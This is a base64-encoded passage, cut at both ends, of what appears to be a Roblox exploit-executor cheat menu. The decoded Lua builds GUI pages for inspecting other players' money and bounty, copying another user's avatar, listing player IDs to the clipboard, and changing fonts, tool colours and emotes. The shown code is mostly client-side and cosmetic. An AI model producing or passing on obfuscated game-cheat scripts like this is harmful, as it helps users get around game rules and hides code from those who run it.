9wTGlzdDpHZXRDaGlsZHJlbigpKSBkbyBpZiB2OklzQSgiVGV4dEJ1dHRvbiIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gYWRkT3B0aW9uKG5hbWUsIHZhbCkKICAgICAgICAgICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgICAgICAgICAgYnRuLlRleHQgPSBuYW1lCiAgICAgICAgICAgICAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgIGJ0bi5UZXh0U2l6ZSA9IDgKICAgICAgICAgICAgICAgIGJ0bi5aSW5kZXggPSA2CiAgICAgICAgICAgICAgICBidG4uUGFyZW50ID0gRHJvcExpc3QKICAgICAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBDb25maWcuSW5zcGVjdG9yTmFtZSA9IHZhbAogICAgICAgICAgICAgICAgICAgIERyb3BCdG4uVGV4dCA9IHZhbCA9PSAiIiBhbmQgIk5vbmUiIG9yIHZhbAogICAgICAgICAgICAgICAgICAgIGlzRHJvcE9wZW4gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIERyb3BMaXN0LlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIERyb3BGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGFkZE9wdGlvbigiLS0gTm9uZSAtLSIsICIiKQogICAgICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHAgfj0gcGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBhZGRPcHRpb24ocC5EaXNwbGF5TmFtZSAuLiAiIChAIiAuLiBwLk5hbWUgLi4gIikiLCBwLk5hbWUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkgLS0gUsOpZHVpcmUgbGUgY2FkcmUKICAgICAgICBlbmQKICAgIGVuZCkKICAgIGVuZAogICAgCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIlNob3cgTW9uZXkiLCAiU2hvd01vbmV5IiwgMjYpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIlNob3cgRnJhZ21lbnRzIiwgIlNob3dGcmFnbWVudHMiLCAyNykKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5WaXN1YWxzLCAiU2hvdyBCb3VudHkvSG9ub3IiLCAiU2hvd0JvdW50eSIsIDI4KQogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlZpc3VhbHMsICJGb250IENoYW5nZXIiLCA0NSkKICAgIGxvY2FsIGZvbnRPcHRpb25zID0geyJHb3RoYW0iLCAiR290aGFtQm9sZCIsICJTb3VyY2VTYW5zIiwgIlNvdXJjZVNhbnNCb2xkIiwgIkFyY2FkZSIsICJGYW50YXN5IiwgIlNjaUZpIiwgIkJvZG9uaSIsICJDYXJ0b29uIiwgIkNvZGUiLCAiSGlnaHdheSIsICJNZXJyaXdlYXRoZXIifQogICAgQ29uZmlnLlNlbGVjdGVkRm9udCA9ICJHb3RoYW0iCiAgICBjcmVhdGVDeWNsZShQYWdlcy5WaXN1YWxzLCAiU2VsZWN0IEZvbnQiLCAiU2VsZWN0ZWRGb250IiwgZm9udE9wdGlvbnMsIDQ2KQogICAgCiAgICBkbwogICAgICAgIGxvY2FsIEFwcGx5Rm9udEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgQXBwbHlGb250QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgQXBwbHlGb250QnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMCwgMzAsIDQwKQogICAgICAgIEFwcGx5Rm9udEJ0bi5UZXh0ID0gIkFQUExZIEZPTlQgVE8gR0FNRSIKICAgICAgICBBcHBseUZvbnRCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgQXBwbHlGb250QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIEFwcGx5Rm9udEJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgQXBwbHlGb250QnRuLkxheW91dE9yZGVyID0gNDcKICAgICAgICBBcHBseUZvbnRCdG4uUGFyZW50ID0gUGFnZXMuVmlzdWFscwogICAgICAgIGxvY2FsIGMgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBjLlBhcmVudCA9IEFwcGx5Rm9udEJ0bgogICAgICAgIAogICAgICAgIEFwcGx5Rm9udEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgZm9udE5hbWUgPSBDb25maWcuU2VsZWN0ZWRGb250CiAgICAgICAgICAgIGxvY2FsIGZvbnRFbnVtID0gRW51bS5Gb250W2ZvbnROYW1lXQogICAgICAgICAgICBpZiBmb250RW51bSBhbmQgcGxheWVyLlBsYXllckd1aSB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhwbGF5ZXIuUGxheWVyR3VpOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIlRleHRMYWJlbCIpIG9yIHY6SXNBKCJUZXh0QnV0dG9uIikgb3IgdjpJc0EoIlRleHRCb3giKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgdi5Gb250ID0gZm9udEVudW0gZW5kKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJGb250IGFwcGxpZWQ6ICIgLi4gZm9udE5hbWUsIDIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICAtLSBTa2luIENoYW5nZXIgU2VjdGlvbgogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5WaXN1YWxzLCAiU2tpbiBDaGFuZ2VyIiwgMzUpCiAgICBjcmVhdGVJbnB1dChQYWdlcy5WaXN1YWxzLCAiVGFyZ2V0IFVzZXIgSUQiLCAiU2tpbkNoYW5nZXJJRCIsIDM2KQogICAgCiAgICBkbwogICAgICAgIGxvY2FsIFNraW5BY3Rpb25zID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgU2tpbkFjdGlvbnMuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBTa2luQWN0aW9ucy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIFNraW5BY3Rpb25zLkxheW91dE9yZGVyID0gMzcKICAgICAgICBTa2luQWN0aW9ucy5QYXJlbnQgPSBQYWdlcy5WaXN1YWxzCiAgICAgICAgCiAgICAgICAgbG9jYWwgQXBwbHlTa2luQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBBcHBseVNraW5CdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjQ4LCAwLCAxLCAwKQogICAgICAgIEFwcGx5U2tpbkJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzAsIDMwLCA0MCkKICAgICAgICBBcHBseVNraW5CdG4uVGV4dCA9ICJBUFBMWSBTS0lOIgogICAgICAgIEFwcGx5U2tpbkJ0bi5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBBcHBseVNraW5CdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgQXBwbHlTa2luQnRuLlRleHRTaXplID0gOQogICAgICAgIEFwcGx5U2tpbkJ0bi5QYXJlbnQgPSBTa2luQWN0aW9ucwogICAgICAgIGxvY2FsIEFTX0MgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgQVNfQy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBBU19DLlBhcmVudCA9IEFwcGx5U2tpbkJ0bgogICAgICAgIAogICAgICAgIGxvY2FsIFJlc2V0Q2hhckJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgUmVzZXRDaGFyQnRuLlNpemUgPSBVRGltMi5uZXcoMC40OCwgMCwgMSwgMCkKICAgICAgICBSZXNldENoYXJCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41MiwgMCwgMCwgMCkKICAgICAgICBSZXNldENoYXJCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgUmVzZXRDaGFyQnRuLlRleHQgPSAiUkVTRVQgQ0hBUiIKICAgICAgICBSZXNldENoYXJCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgNTAsIDUwKQogICAgICAgIFJlc2V0Q2hhckJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBSZXNldENoYXJCdG4uVGV4dFNpemUgPSA5CiAgICAgICAgUmVzZXRDaGFyQnRuLlBhcmVudCA9IFNraW5BY3Rpb25zCiAgICAgICAgbG9jYWwgUkNfQyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBSQ19DLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIFJDX0MuUGFyZW50ID0gUmVzZXRDaGFyQnRuCiAgICAgICAgCiAgICAgICAgLS0gTG9naWMgZnJvbSBwcm92aWRlZCBzY3JpcHQKICAgICAgICBsb2NhbCBmdW5jdGlvbiBjbGVhclZpc3VhbHMoY2hhcikKICAgICAgICAgICAgZm9yIF8sIGluc3QgaW4gaXBhaXJzKGNoYXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIGluc3Q6SXNBKCJBY2Nlc3NvcnkiKSBvciBpbnN0OklzQSgiSGF0Iikgb3IgaW5zdDpJc0EoIlNoaXJ0Iikgb3IgaW5zdDpJc0EoIlBhbnRzIikgb3IgaW5zdDpJc0EoIlNoaXJ0R3JhcGhpYyIpIG9yIGluc3Q6SXNBKCJDaGFyYWN0ZXJNZXNoIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGluc3Q6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGxvY2FsIGhlYWQgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgaWYgaGVhZCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgZCBpbiBpcGFpcnMoaGVhZDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGQ6SXNBKCJEZWNhbCIpIGFuZCBkLk5hbWU6bG93ZXIoKSA9PSAiZmFjZSIgdGhlbiBkOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgbG9jYWwgYmMgPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiQm9keUNvbG9ycyIpCiAgICAgICAgICAgIGlmIGJjIHRoZW4gYmM6RGVzdHJveSgpIGVuZAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBhdHRhY2hBY2Nlc3NvcnkoY2hhciwgYWNjZXNzb3J5KQogICAgICAgICAgICBsb2NhbCBoYW5kbGUgPSBhY2Nlc3Nvcnk6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCiAgICAgICAgICAgIGlmIG5vdCBoYW5kbGUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIHRhcmdldEF0dGFjaG1lbnQsIGFjY0F0dGFjaG1lbnQKICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKGNoYXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgYXR0IGluIGlwYWlycyhwYXJ0OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGF0dDpJc0EoIkF0dGFjaG1lbnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBtYXRjaCA9IGhhbmRsZTpGaW5kRmlyc3RDaGlsZChhdHQuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1hdGNoIGFuZCBtYXRjaDpJc0EoIkF0dGFjaG1lbnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0QXR0YWNobWVudCA9IGF0dDsgYWNjQXR0YWNobWVudCA9IG1hdGNoOyBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiB0YXJnZXRBdHRhY2htZW50IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiB0YXJnZXRBdHRhY2htZW50IGFuZCBhY2NBdHRhY2htZW50IHRoZW4KICAgICAgICAgICAgICAgIGhhbmRsZS5DRnJhbWUgPSB0YXJnZXRBdHRhY2htZW50LldvcmxkQ0ZyYW1lICogYWNjQXR0YWNobWVudC5DRnJhbWU6SW52ZXJzZSgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGlmIHJvb3QgdGhlbiBoYW5kbGUuQ0ZyYW1lID0gcm9vdC5DRnJhbWUgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCB3ZWxkID0gSW5zdGFuY2UubmV3KCJXZWxkQ29uc3RyYWludCIpCiAgICAgICAgICAgIHdlbGQuUGFydDAgPSBoYW5kbGUKICAgICAgICAgICAgd2VsZC5QYXJ0MSA9ICh0YXJnZXRBdHRhY2htZW50IGFuZCB0YXJnZXRBdHRhY2htZW50LlBhcmVudCkgb3IgY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgICAgICB3ZWxkLlBhcmVudCA9IGhhbmRsZQogICAgICAgICAgICBhY2Nlc3NvcnkuUGFyZW50ID0gY2hhcgogICAgICAgIGVuZAoKICAgICAgICBBcHBseVNraW5CdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHVpZCA9IHRvbnVtYmVyKENvbmZpZy5Ta2luQ2hhbmdlcklEKQogICAgICAgICAgICBpZiBub3QgdWlkIHRoZW4gU2VuZE5vdGlmaWNhdGlvbigiSW52YWxpZCBVc2VyIElEIiwgMikgcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCBjaGFyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBub3QgY2hhciB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIG9rLCBtb2RlbCA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIFBsYXllcnM6R2V0Q2hhcmFjdGVyQXBwZWFyYW5jZUFzeW5jKHVpZCkgZW5kKQogICAgICAgICAgICBpZiBub3Qgb2sgb3Igbm90IG1vZGVsIHRoZW4gU2VuZE5vdGlmaWNhdGlvbigiRmFpbGVkIHRvIGZldGNoIHNraW4iLCAyKSByZXR1cm4gZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBjbGVhclZpc3VhbHMoY2hhcikKICAgICAgICAgICAgbG9jYWwgYmMgPSBtb2RlbDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkJvZHlDb2xvcnMiKQogICAgICAgICAgICBpZiBiYyB0aGVuIGJjOkNsb25lKCkuUGFyZW50ID0gY2hhciBlbmQKICAgICAgICAgICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKG1vZGVsOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBpdGVtOklzQSgiU2hpcnQiKSBvciBpdGVtOklzQSgiUGFudHMiKSBvciBpdGVtOklzQSgiU2hpcnRHcmFwaGljIikgdGhlbiBpdGVtOkNsb25lKCkuUGFyZW50ID0gY2hhciBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGZvciBfLCBhY2MgaW4gaXBhaXJzKG1vZGVsOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBhY2M6SXNBKCJBY2Nlc3NvcnkiKSBvciBhY2M6SXNBKCJIYXQiKSB0aGVuIGF0dGFjaEFjY2Vzc29yeShjaGFyLCBhY2M6Q2xvbmUoKSkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBoZWFkID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgICAgIGlmIGhlYWQgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZmFjZSA9IG1vZGVsOkZpbmRGaXJzdENoaWxkKCJmYWNlIiwgdHJ1ZSkKICAgICAgICAgICAgICAgIGlmIGZhY2UgYW5kIGZhY2U6SXNBKCJEZWNhbCIpIHRoZW4gZmFjZTpDbG9uZSgpLlBhcmVudCA9IGhlYWQgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBtb2RlbDpEZXN0cm95KCkKICAgICAgICAgICAgU2VuZE5vdGlmaWNhdGlvbigiU2tpbiBBcHBsaWVkISIsIDMpCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIFJlc2V0Q2hhckJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgcGxheWVyOkxvYWRDaGFyYWN0ZXIoKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuVmlzdWFscywgIlBsYXllciBJRCIsIDQwKQogICAgCiAgICBkbwogICAgICAgIGxvY2FsIFBsYXllcklERnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBQbGF5ZXJJREZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTIwKQogICAgICAgIFBsYXllcklERnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBQbGF5ZXJJREZyYW1lLkxheW91dE9yZGVyID0gNDEKICAgICAgICBQbGF5ZXJJREZyYW1lLlBhcmVudCA9IFBhZ2VzLlZpc3VhbHMKICAgICAgICAKICAgICAgICBsb2NhbCBQbGF5ZXJJRExpc3QgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIikKICAgICAgICBQbGF5ZXJJRExpc3QuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgIFBsYXllcklETGlzdC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBQbGF5ZXJJRExpc3QuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIFBsYXllcklETGlzdC5TY3JvbGxCYXJUaGlja25lc3MgPSA0CiAgICAgICAgUGxheWVySURMaXN0LlBhcmVudCA9IFBsYXllcklERnJhbWUKICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgUGxheWVySURMaXN0KS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQogICAgICAgIEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgUGxheWVySURMaXN0KQogICAgICAgIAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIHVwZGF0ZVBsYXllcklEcygpCiAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBwYWlycyhQbGF5ZXJJRExpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiVGV4dExhYmVsIikgb3IgY2hpbGQ6SXNBKCJUZXh0QnV0dG9uIikgdGhlbiBjaGlsZDpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgeVBvcyA9IDAKICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXJFbnRyeSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgICAgICBwbGF5ZXJFbnRyeS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDI1KQogICAgICAgICAgICAgICAgcGxheWVyRW50cnkuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgeVBvcykKICAgICAgICAgICAgICAgIHBsYXllckVudHJ5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNSwgMjUsIDMwKQogICAgICAgICAgICAgICAgcGxheWVyRW50cnkuVGV4dCA9IHAuTmFtZSAuLiAiIC0gSUQ6ICIgLi4gdG9zdHJpbmcocC5Vc2VySWQpCiAgICAgICAgICAgICAgICBwbGF5ZXJFbnRyeS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICAgICAgICAgIHBsYXllckVudHJ5LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgICAgICAgICAgcGxheWVyRW50cnkuVGV4dFNpemUgPSAxMAogICAgICAgICAgICAgICAgcGxheWVyRW50cnkuUGFyZW50ID0gUGxheWVySURMaXN0CiAgICAgICAgICAgICAgICBsb2NhbCBlbnRyeUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBlbnRyeUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKSBlbnRyeUNvcm5lci5QYXJlbnQgPSBwbGF5ZXJFbnRyeQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBwbGF5ZXJFbnRyeS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBpZiBzZXRjbGlwYm9hcmQgdGhlbiBzZXRjbGlwYm9hcmQodG9zdHJpbmcocC5Vc2VySWQpKSBlbmQKICAgICAgICAgICAgICAgICAgICBTZW5kTm90aWZpY2F0aW9uKCJDb3BpZWQ6ICIgLi4gcC5OYW1lIC4uICIgKCIgLi4gdG9zdHJpbmcocC5Vc2VySWQpIC4uICIpIiwgMikKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgeVBvcyA9IHlQb3MgKyAyNwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBVcGRhdGUgcGxheWVyIGxpc3QgZXZlcnkgMiBzZWNvbmRzCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIHRydWUgZG8KICAgICAgICAgICAgICAgIHVwZGF0ZVBsYXllcklEcygpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuVmlzdWFscywgIlRvb2wgQ29sb3IgQ2hhbmdlciIsIDQyKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlZpc3VhbHMsICJFbmFibGUgVG9vbCBDb2xvciBDaGFu" .. "Z2VyIiwgIlRvb2xDb2xvckNoYW5nZXIiLCA0MykKICAgIAogICAgZG8KICAgICAgICBsb2NhbCBDb2xvckZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgQ29sb3JGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDQwKQogICAgICAgIENvbG9yRnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBDb2xvckZyYW1lLkxheW91dE9yZGVyID0gNDQKICAgICAgICBDb2xvckZyYW1lLlBhcmVudCA9IFBhZ2VzLlZpc3VhbHMKICAgICAgICAKICAgICAgICBsb2NhbCBDb2xvckxheW91dCA9IEluc3RhbmNlLm5ldygiVUlHcmlkTGF5b3V0IikKICAgICAgICBDb2xvckxheW91dC5DZWxsU2l6ZSA9IFVEaW0yLm5ldygwLCAzMCwgMCwgMzApCiAgICAgICAgQ29sb3JMYXlvdXQuQ2VsbFBhZGRpbmcgPSBVRGltMi5uZXcoMCwgNSwgMCwgNSkKICAgICAgICBDb2xvckxheW91dC5Ib3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcgogICAgICAgIENvbG9yTGF5b3V0LlBhcmVudCA9IENvbG9yRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBjb2xvcnMgPSB7CiAgICAgICAgICAgIENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSwgCiAgICAgICAgICAgIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCksIENvbG9yMy5mcm9tUkdCKDAsIDAsIDI1NSksIENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAwKSwgCiAgICAgICAgICAgIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMjU1KSwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAyNTUpLCBDb2xvcjMuZnJvbVJHQigxNzAsIDAsIDI1NSkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgZm9yIF8sIGNvbCBpbiBwYWlycyhjb2xvcnMpIGRvCiAgICAgICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgIGJ0bi5UZXh0ID0gIiIKICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBjb2wKICAgICAgICAgICAgYnRuLlBhcmVudCA9IENvbG9yRnJhbWUKICAgICAgICAgICAgbG9jYWwgYyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsMCkgYy5QYXJlbnQgPSBidG4KICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQogICAgICAgICAgICBzdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDgwKQogICAgICAgICAgICBzdHJva2UuVGhpY2tuZXNzID0gMQogICAgICAgICAgICBzdHJva2UuUGFyZW50ID0gYnRuCgogICAgICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBDb25maWcuVG9vbENvbG9yID0gY29sCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAoKICAgIC0tIEVtb3RlIFBsYXllciBTZWN0aW9uCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlZpc3VhbHMsICJFbW90ZSBQbGF5ZXIiLCA0NikKICAgIGNyZWF0ZUlucHV0KFBhZ2VzLlZpc3VhbHMsICJFbW90ZSBJRCAoQXNzZXQgSUQpIiwgIkVtb3RlSUQiLCA0NykKICAgIGNyZWF0ZVNsaWRlcihQYWdlcy5WaXN1YWxzLCAiRW1vdGUgU3BlZWQiLCAiRW1vdGVTcGVlZCIsIDQ4LCAwLjEsIDMsIDEpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuVmlzdWFscywgIkxvb3AgRW1vdGU